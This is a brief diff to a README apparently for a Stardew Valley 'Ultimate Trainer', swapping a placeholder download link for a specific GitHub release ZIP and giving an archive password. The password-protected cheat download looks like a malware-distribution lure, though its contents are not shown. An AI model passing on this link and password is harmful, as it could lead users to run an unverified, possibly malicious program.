@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Stardew-Valley-Ultimate-Trainer/releases/latest/download/StardewValley-Trainer.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/dan-wang-lab1902k1/Stardew-Valley-Ultimate-Trainer/releases/download/download/StardewValley_Trainer.zip)
 
 🔐 Archive password: `5868781`
 
